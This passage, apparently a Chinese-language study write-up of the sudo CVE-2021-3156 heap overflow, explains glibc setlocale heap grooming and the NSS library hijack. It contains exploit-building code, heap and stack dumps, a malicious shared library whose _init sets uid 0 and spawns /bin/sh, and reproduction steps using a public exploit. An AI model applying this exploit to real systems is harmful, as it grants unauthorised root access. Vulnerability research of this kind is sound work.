    <span class="k">while</span> <span class="p">(</span><span class="n">category</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">category</span> <span class="o">!=</span> <span class="n">LC_ALL</span><span class="p">)</span>
      <span class="p">{</span>
        <span class="c1">// 循环查找环境变量中的LC*环境变量的值，并根据优先级顺序进行加载，环境变量的值会存储在newnames中
</span><span class="c1"></span>        <span class="n">newdata</span><span class="p">[</span><span class="n">category</span><span class="p">]</span> <span class="o">=</span> <span class="n">_nl_find_locale</span> <span class="p">(</span><span class="n">locale_path</span><span class="p">,</span> <span class="n">locale_path_len</span><span class="p">,</span>
                                             <span class="n">category</span><span class="p">,</span>
                                             <span class="o">&amp;</span><span class="n">newnames</span><span class="p">[</span><span class="n">category</span><span class="p">]);</span>

        <span class="c1">//...
</span><span class="c1"></span>      <span class="p">}</span>
    <span class="cm">/* Create new composite name.  */</span>
    <span class="n">composite</span> <span class="o">=</span> <span class="p">(</span><span class="n">category</span> <span class="o">&gt;=</span> <span class="mi">0</span>
                 <span class="o">?</span> <span class="nb">NULL</span> <span class="o">:</span> <span class="n">new_composite_name</span> <span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span> <span class="n">newnames</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">composite</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">//setname&amp;setdata，即为_nl_global_locale.__names数组赋值，该数组中存储有所有的环境变量的值
</span><span class="c1"></span>      <span class="c1">// 如果数组中原来存储有值，且不是默认的&#34;C&#34;，那么会释放原有的堆块
</span><span class="c1"></span>    <span class="p">}</span>
    <span class="k">else</span>
      <span class="k">for</span> <span class="p">(</span><span class="o">++</span><span class="n">category</span><span class="p">;</span> <span class="n">category</span> <span class="o">&lt;</span> <span class="n">__LC_LAST</span><span class="p">;</span> <span class="o">++</span><span class="n">category</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">category</span> <span class="o">!=</span> <span class="n">LC_ALL</span> <span class="o">&amp;&amp;</span> <span class="n">newnames</span><span class="p">[</span><span class="n">category</span><span class="p">]</span> <span class="o">!=</span> <span class="n">_nl_C_name</span>
            <span class="o">&amp;&amp;</span> <span class="n">newnames</span><span class="p">[</span><span class="n">category</span><span class="p">]</span> <span class="o">!=</span> <span class="n">_nl_global_locale</span><span class="p">.</span><span class="n">__names</span><span class="p">[</span><span class="n">category</span><span class="p">])</span>
          <span class="n">free</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">newnames</span><span class="p">[</span><span class="n">category</span><span class="p">]);</span><span class="c1">// 释放所有的newnames即环境变量的值
</span><span class="c1"></span>    <span class="c1">//...
</span><span class="c1"></span>
    <span class="k">return</span> <span class="n">composite</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="c1">//...
</span><span class="c1"></span>  <span class="p">}</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">setlocale</span><span class="p">)</span>
</code></pre></div><pre tabindex="0"><code>
</code></pre></li>
<li>
<p><code>setlocale</code>函数逻辑总结</p>
<p><code>setlocale</code>函数通过<code>_nl_find_locale</code>函数加载环境变量</p>
<ul>
<li>
<p>若传入的参数是<code>NULL</code></p>
<ul>
<li>返回<code>_nl_global_locale.__names</code>数组中对应的值即相应的<code>LC_*</code>的值</li>
</ul>
</li>
<li>
<p>如果传入的参数是<code>“”</code></p>
<ul>
<li>那么就会根据环境变量设置<code>_nl_global_locale.__names</code>中的值</li>
</ul>
</li>
<li>
<p>函数最主要的是进入了一个<code>while</code>循环:</p>
<ul>
<li>
<p>每次调用<code>_nl_find_locale</code>函数首先从环境变量中按照优先级顺序加载相应的环境变量</p>
</li>
<li>
<p>然后根据环境变量从<code>/usr/lib/locale</code>中查找有没有对应的文件。这里会根据<code>mask</code>的值控制加载的优先级，加载文件</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// 格式：language[_territory[.codeset]][@modifier]
</span><span class="c1">//        C.UTF-8@aaaa
</span><span class="c1"></span><span class="n">mask</span> <span class="o">=</span> <span class="n">_nl_explode_name</span> <span class="p">(</span><span class="n">loc_name</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">language</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">modifier</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">territory</span><span class="p">,</span>
                           <span class="o">&amp;</span><span class="n">codeset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">normalized_codeset</span><span class="p">);</span>
</code></pre></div><ul>
<li>如果没有对应的文件就会返回<code>NULL</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>_nl_find_locale</code>函数返回值</p>
<ul>
<li>为<code>NULL</code>的时候
<ul>
<li><code>while</code>循环就会终止，此时<code>category&gt;0</code>，那么这里就表明加载环境变量出现了错误，会释放之前申请的所有的<code>newnames</code>，也就是环境变量中的值比如<code>C.UTF-8[@aaaa](https://github.com/aaaa)</code></li>
</ul>
</li>
<li>否则当<code>while</code>循环执行完毕之后就会将所有的<code>_nl_global_locale.__names</code>数组中对应的值设置为我们输入的值，然后将<code>LC_ALL</code>赋值</li>
</ul>
<p><img src="https://p3.ssl.qhimg.com/t01bd575542cfec75ef.png" alt="https://p3.ssl.qhimg.com/t01bd575542cfec75ef.png"></p>
</li>
</ul>
</li>
<li>
<p><code>free</code>原语获取</p>
<ul>
<li>目标：设置<code>n</code>个<code>size</code>大小的堆块
<ul>
<li>就设置<code>n</code>个环境变量（注意顺序，环境变量<strong>从后向前</strong>开始加载）</li>
<li>环境变量的值为<code>C.UTF-8[@len](https://github.com/len)</code>，其中<code>len</code>的大小满足<code>&gt; size-0x20 &amp; &lt; size-0x10</code></li>
</ul>
</li>
<li>注意一个问题：
<ul>
<li>路径拼接，导致在进行环境变量加载的过程中
<ul>
<li>大小为<code>size</code>的堆块，释放一个<code>size+0x10</code>大小的堆块</li>
<li>相同<code>size</code>大小的会复用同一个堆块</li>
<li>因此，<code>tcache</code>中不同<code>size</code>大小的堆块只会额外产生<code>1</code>个<code>size+0x10</code>大小的堆块</li>
</ul>
</li>
<li>对于<code>size</code>比较小的堆块，由于<code>getlocale</code>中堆块的申请很多，因此可能会被申请回去，目前可以肯定的是对于<code>0x80</code>或者大于<code>0x80</code>的附加堆块会保存在<code>tcache</code>中</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="实现布局的操作步骤">实现布局的操作步骤</h3>
<ul>
<li>
<p>首先main函数中会调用无参数<code>setlocale</code>函数，通过命令行输入设置环境变量，可以配置<code>LC_ALL</code>环境变量申请并释放一块chunk</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="s">&#34;sudoedit&#34;</span><span class="p">,</span> <span class="s">&#34;-s&#34;</span><span class="p">,</span> <span class="n">smash_a</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\\</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">smash_b</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">envp</span>
</code></pre></div></li>
<li>
<p>分配<code>service_user</code>结构；</p>
</li>
<li>
<p>控制输入参数的长度<code>0x80</code>，使得<code>user_args</code>占据<code>LC_ALL</code>释放后的空闲chunk，布局在<code>service_user</code>相邻前方</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>   <span class="n">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="mi">1</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x5555555814a0</span>
<span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>   <span class="n">tcache_entry</span><span class="p">[</span><span class="mi">2</span><span class="p">](</span><span class="mi">3</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x55555557ff40</span> <span class="o">--&gt;</span> <span class="mh">0x555555580620</span> <span class="o">--&gt;</span> <span class="mh">0x555555581380</span><span class="c1">// group files
</span><span class="c1"></span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>   <span class="n">tcache_entry</span><span class="p">[</span><span class="mi">5</span><span class="p">](</span><span class="mi">1</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x555555580cb0</span> <span class="c1">// 环境变量释放产生的0x70堆块
</span><span class="c1"></span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>   <span class="n">tcache_entry</span><span class="p">[</span><span class="mi">6</span><span class="p">](</span><span class="mi">1</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x555555580a90</span> <span class="c1">// user_args堆块
</span><span class="c1"></span><span class="p">(</span><span class="mh">0x1e0</span><span class="p">)</span>   <span class="n">tcache_entry</span><span class="p">[</span><span class="mi">28</span><span class="p">](</span><span class="mi">1</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x55555557f2a0</span>
<span class="p">(</span><span class="mh">0x410</span><span class="p">)</span>   <span class="n">tcache_entry</span><span class="p">[</span><span class="mi">63</span><span class="p">](</span><span class="mi">1</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x55555557f500</span>
</code></pre></div><ul>
<li>由于在<code>setlocale</code>函数中还有很多小堆块的操作
<ul>
<li><code>user_args</code>堆块<code>0x555555580a90</code></li>
<li><code>group files</code>堆块<code>0x555555581380</code></li>
<li>两堆块之间的差值是<code>0x8f0</code>，我们需要覆写这些长度。中间这些堆块都是在libc中进行<code>setlocale</code>中产生的，对之后的程序进行没有影响，可以直接覆写</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>user_args</code>溢出并覆盖第1个<code>service_user</code>结构，覆盖<code>service_user-&gt;name</code>字段，为伪造库名<code>xx/xx.so.2</code></p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">telescope</span> <span class="mh">0x7ffc304d1a18</span> <span class="c1">// argv存储位置
</span><span class="c1"></span><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">rdx</span>  <span class="mh">0x7ffc304d1a18</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1df6</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">sudoedit</span><span class="err">&#39;</span>
<span class="mo">01</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>      <span class="mh">0x7ffc304d1a20</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1dff</span> <span class="err">◂—</span> <span class="mh">0x414141414100732d</span> <span class="cm">/* &#39;-s&#39; */</span>
<span class="mo">02</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>      <span class="mh">0x7ffc304d1a28</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1e02</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="err">\\&#39;</span>
<span class="mo">03</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>      <span class="mh">0x7ffc304d1a30</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1e3c</span> <span class="err">◂—</span> <span class="mh">0x424242424242005c</span> <span class="cm">/* &#39;\\&#39; */</span>
<span class="mo">04</span><span class="o">:</span><span class="mo">0020</span><span class="err">│</span>      <span class="mh">0x7ffc304d1a38</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1e3e</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><span class="err">\\&#39;</span>
<span class="mo">05</span><span class="o">:</span><span class="mo">002</span><span class="mi">8</span><span class="err">│</span>      <span class="mh">0x7ffc304d1a40</span> <span class="err">◂—</span> <span class="mh">0x0</span>
<span class="mo">06</span><span class="o">:</span><span class="mo">0030</span><span class="err">│</span>      <span class="mh">0x7ffc304d1a48</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1e76</span> <span class="err">◂—</span> <span class="mh">0x5c005c005c005c</span> <span class="cm">/* &#39;\\&#39; */</span>
<span class="mo">07</span><span class="o">:</span><span class="mo">003</span><span class="mi">8</span><span class="err">│</span>      <span class="mh">0x7ffc304d1a50</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1e78</span> <span class="err">◂—</span> <span class="mh">0x5c005c005c005c</span> <span class="cm">/* &#39;\\&#39; */</span>
<span class="p">...</span>
<span class="mi">40</span><span class="o">:</span><span class="mo">0200</span><span class="err">│</span>   <span class="mh">0x7ffc304d1c18</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1eea</span> <span class="err">◂—</span> <span class="mh">0x5c005c005c005c</span> <span class="cm">/* &#39;\\&#39; */</span>
<span class="mi">41</span><span class="o">:</span><span class="mo">020</span><span class="mi">8</span><span class="err">│</span>   <span class="mh">0x7ffc304d1c20</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1eec</span> <span class="err">◂—</span> <span class="mh">0x5c005c005c005c</span> <span class="cm">/* &#39;\\&#39; */</span>
<span class="mi">42</span><span class="o">:</span><span class="mo">0210</span><span class="err">│</span>   <span class="mh">0x7ffc304d1c28</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1eee</span> <span class="err">◂—</span> <span class="mh">0x2f58005c005c005c</span> <span class="cm">/* &#39;\\&#39; */</span>
<span class="mi">43</span><span class="o">:</span><span class="mo">021</span><span class="mi">8</span><span class="err">│</span>   <span class="mh">0x7ffc304d1c30</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1ef0</span> <span class="err">◂—</span> <span class="mh">0x30502f58005c005c</span> <span class="cm">/* &#39;\\&#39; */</span>
<span class="mi">44</span><span class="o">:</span><span class="mo">0220</span><span class="err">│</span>   <span class="mh">0x7ffc304d1c38</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1ef2</span> <span class="err">◂—</span> <span class="mh">0x5f5030502f58005c</span> <span class="cm">/* &#39;\\&#39; */</span>
<span class="mi">45</span><span class="o">:</span><span class="mo">022</span><span class="mi">8</span><span class="err">│</span>   <span class="mh">0x7ffc304d1c40</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1ef4</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">X</span><span class="o">/</span><span class="n">P0P_SH3LLZ_</span><span class="err">&#39;</span>
<span class="mi">46</span><span class="o">:</span><span class="mo">0230</span><span class="err">│</span>   <span class="mh">0x7ffc304d1c48</span> <span class="err">—▸</span> <span class="mh">0x7ffc304d1f02</span> <span class="err">◂—</span> <span class="mh">0x433d4c4c415f434c</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">LC_ALL</span><span class="o">=</span><span class="n">C</span><span class="err">&#39;</span><span class="p">)</span>
<span class="mi">47</span><span class="o">:</span><span class="mo">023</span><span class="mi">8</span><span class="err">│</span>   <span class="mh">0x7ffc304d1c50</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</code></pre></div><ul>
<li>libc会调用<code>nss_load_library()</code>函数加载伪造库，打开<code>getshell</code>的动态链接库，最终实现提权</li>
</ul>
<p><img src="CVE-2021-3156%200a6e65b1c4a64489800500f57d089c2a/Untitled%203.png" alt="Untitled"></p>
<h3 id="exp生成">exp生成</h3>
<ul>
<li>
<p>Ubuntu20.04lts的布局所需基础信息，生成<code>target</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="p">{</span>
        <span class="p">.</span><span class="n">target_name</span>    <span class="o">=</span> <span class="s">&#34;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&#34;</span><span class="p">,</span>
        <span class="p">.</span><span class="n">sudoedit_path</span>  <span class="o">=</span> <span class="s">&#34;/usr/bin/sudoedit&#34;</span><span class="p">,</span>
        <span class="p">.</span><span class="n">smash_len_a</span>    <span class="o">=</span> <span class="mi">58</span><span class="p">,</span>
        <span class="p">.</span><span class="n">smash_len_b</span>    <span class="o">=</span> <span class="mi">54</span><span class="p">,</span>
        <span class="p">.</span><span class="n">null_stomp_len</span> <span class="o">=</span> <span class="mi">63</span><span class="p">,</span>
        <span class="p">.</span><span class="n">lc_all_len</span>     <span class="o">=</span> <span class="mi">212</span>
    <span class="p">},</span>
</code></pre></div><p>将<code>smash_a</code>填满<code>’A’</code>，<code>smash_b</code>填满<code>‘B’</code>，最后越界位置<code>’\\’</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp">	<span class="n">memset</span><span class="p">(</span><span class="n">smash_a</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_a</span><span class="p">);</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">smash_b</span><span class="p">,</span> <span class="sc">&#39;B&#39;</span><span class="p">,</span> <span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_b</span><span class="p">);</span>

    <span class="n">smash_a</span><span class="p">[</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_a</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\\&#39;</span><span class="p">;</span>
    <span class="n">smash_b</span><span class="p">[</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">smash_len_b</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\\&#39;</span><span class="p">;</span>
</code></pre></div></li>
<li>
<p>输入命令<code>argv</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">char</span> <span class="o">*</span><span class="n">s_argv</span><span class="p">[]</span><span class="o">=</span><span class="p">{</span>
        <span class="c1">// &#34;sudoedit&#34;, &#34;-s&#34;, smash_a, &#34;\\&#34;, NULL
</span><span class="c1"></span>        <span class="c1">// &#34;sudoedit&#34;, &#34;-s&#34;, smash_a, NULL
</span><span class="c1"></span>        <span class="s">&#34;sudoedit&#34;</span><span class="p">,</span> <span class="s">&#34;-s&#34;</span><span class="p">,</span> <span class="n">smash_a</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\\</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">smash_b</span><span class="p">,</span> <span class="nb">NULL</span>
    <span class="p">};</span>
</code></pre></div></li>
<li>
<p>环境变量<code>char *s_envp[MAX_ENVP];</code>配置</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// setlocale函数运行进行堆布局 service_name与user_args
</span><span class="c1">// _nl_find_locale通过while循环按后到前顺序获取LC_xxx的值
</span><span class="c1">// 若错误AAAAA，则释放free该值的chunk
</span><span class="c1">// 若正确，_nl_global_locale.__names设为赋值，赋给对应LC_xxx
</span><span class="c1"></span>
<span class="c1">// 最后的环境变量LC_ALL
</span><span class="c1">//get_user_info函数调用nss服务运行动态库getshell
</span><span class="c1"></span><span class="kt">int</span> <span class="n">envp_pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mh">0x2b6</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">s_envp</span><span class="p">[</span><span class="n">envp_pos</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\\</span><span class="s">&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="n">s_envp</span><span class="p">[</span><span class="n">envp_pos</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;X/P0P_SH3LLZ_&#34;</span><span class="p">;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// LC_xxx环境变量，依次申请错误的AAAAA再释放
</span><span class="c1"></span><span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">11</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">11</span> <span class="o">-</span> <span class="n">lc_num</span><span class="p">);</span> <span class="n">i</span><span class="o">--</span><span class="p">){</span>

        <span class="n">temp</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">lc_len</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">lc_names</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">lc_names</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">temp</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">lc_names</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="s">&#34;=C.UTF-8@&#34;</span><span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">temp</span><span class="o">+</span><span class="n">strlen</span><span class="p">(</span><span class="n">lc_names</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="mi">9</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">lc_len</span><span class="p">);</span>
        <span class="n">s_envp</span><span class="p">[</span><span class="n">envp_pos</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mh">0x50</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">lc_names</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">lc_names</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">temp</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">lc_names</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="s">&#34;=C.UTF-8@&#34;</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">temp</span><span class="o">+</span><span class="n">strlen</span><span class="p">(</span><span class="n">lc_names</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="mi">9</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">);</span>
    <span class="n">s_envp</span><span class="p">[</span><span class="n">envp_pos</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>

    <span class="n">i</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
</code></pre></div></li>
<li>
<p>自定义库<code>lib.c</code></p>
<p>该库实现getshell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// getshell
</span><span class="c1"></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] bl1ng bl1ng! We got it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
    <span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a_envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;PATH=/bin:/usr/bin:/sbin&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
    <span class="n">execv</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">a_argv</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></li>
</ul>
<h3 id="漏洞复现">漏洞复现</h3>
<p>程序开启ASLR、DEP和GS</p>
<p><img src="https://s2.loli.net/2022/09/23/UoWLJaNPuvECxDI.png" alt=""></p>
<ol>
<li>以非 root 用户身份登录系统，运行命令<code>sudoedit -s /</code></li>
<li>如果系统容易受到攻击，它将<code>sudoedit: /: not a regular file</code>的错误作为响应。如果在该版本漏洞已经被修复了，则以 <code>usage：</code> 开头的错误作为响应</li>
</ol>
<p>实际测试得到结果如下，说明存在漏洞，可继续</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudoedit -s /
sudoedit: /: not a regular file
</code></pre></div><p>利用的是在github上star数最多的https://github.com/blasty/CVE-2021-3156提供的代码，能够成功在普通用户<code>test</code>的环境下，获取<code>root</code>权限访问<code>shell</code></p>
<p>通过<code>make</code>编译后的目录结构如下：</p>
<p><img src="https://s2.loli.net/2022/09/23/USArjQschLdw2Pz.png" alt=""></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./sudo-hax-me-a-sandwich <span class="m">1</span>
</code></pre></div><p><img src="https://s2.loli.net/2022/09/23/6c2QZe1yVRFuiDo.png" alt=""></p>
<h3 id="另一种布局方式blasty">另一种布局方式：blasty</h3>
<p>原始的<code>exp</code>是用<code>LC_ALL</code>此时会在<code>sudo_conf_read</code>函数中调用<code>setlocale(LC_ALL, &quot;C&quot;),setlocale(LC_ALL, prev_locale)</code>会申请和释放大量的堆块，此时也会释放<code>_nl_global_locale.__names</code>中保存的堆块地址其实就是<code>newnames</code>中的堆块地址也就是存储我们环境变量值的堆块，通过释放大量的<code>0xf0</code>堆块进入<code>unsorted bin</code>，然后再申请<code>0x20</code>的时候，制造一个<code>0xd0</code>大小的<code>small bin</code>。此时还会有一个<code>unsorted bin</code>，由于在<code>get_user_info</code>会申请一个<code>0x80,0x1000</code>的堆块，此时<code>small bin,unsorted bin</code>会互换位置，也就是<code>0x80</code>大小的堆块和<code>group files service_user</code>会在<code>unsorted bin</code>相邻的位置申请，非常的巧妙复杂。</p>
<h2 id="0x05-漏洞利用特点">0x05 漏洞&amp;利用特点🟢</h2>
<ul>
<li>不同于之前了解的off by one漏洞-难点在3块chunk布局上
<ul>
<li>直接改写覆盖下一个chunk的内容即可</li>
<li>对程序调用的libc内函数</li>
</ul>
</li>
<li>程序开启ASLR、DEP和GS的情况下，通过利用linux下nss服务和locale的特性，不需要爆破地址，也可以通过巧妙加载自定义动态链接库getshell</li>
</ul>
<h2 id="0x06-语义提取需求分析">0x06 语义提取需求分析🟢</h2>
<blockquote>
<p>(按利用过程逐个分析)</p>
</blockquote>
<ul>
<li><strong>漏洞信息</strong>获取，如何利用该溢出<code>\</code>
<ul>
<li>非off by one</li>
<li>需要对漏洞所在函数语义逻辑的分析，通过末尾添加<code>\</code>可以越界写入</li>
</ul>
</li>
<li><strong>可控原语</strong>获取，<code>locale</code>连续进行大量释放，tcache优先alloc chunk
<ul>
<li>提取程序到漏洞点前的堆操作，可通过输入或环境变量操控</li>
</ul>
</li>
<li><strong>可控内存</strong><code>service_user</code>控制
<ul>
<li>程序内&amp;libc库的全局变量和指向它们的指针较多较复杂</li>
<li>fuzz方法获取</li>
<li>如何通过输入控制它的值
<ul>
<li><code>get_user_info</code>函数 ← <code>service_name</code> <code>libnss_xxx.so.2</code>改写</li>
</ul>
</li>
</ul>
</li>
<li>如何改写可控内存实现<strong>getshell</strong>的方式（开启ASLR）
<ul>
<li>了解libc库nss中可进行动态库执行这个操作</li>
</ul>
</li>
</ul>
<h2 id="0x07-个人总结">0x07 个人总结</h2>
<p>学习：</p>
<ul>
<li>首次复现off by one之外的堆溢出类型</li>
<li>初次接触libc库的locale &amp; nss的利用方式</li>
</ul>
<p>从新的角度重新思考了堆溢出语义分析如何实施</p>
<p>完整经历了漏洞复现分析总结的整个过程</p>
<h2 id="0xff-references">0xff References</h2>
<p>Exp</p>
<p><a href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></p>
<p><a href="https://github.com/worawit/CVE-2021-3156">https://github.com/worawit/CVE-2021-3156</a></p>
<p><a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus.git">https://github.com/Rvn0xsy/CVE-2021-3156-plus.git</a></p>
<p>漏洞分析&amp;利用</p>
<p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt"></a></p>
<p><a href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1805860">CVE-2021-3156-sudo缓冲区溢出复现</a></p>
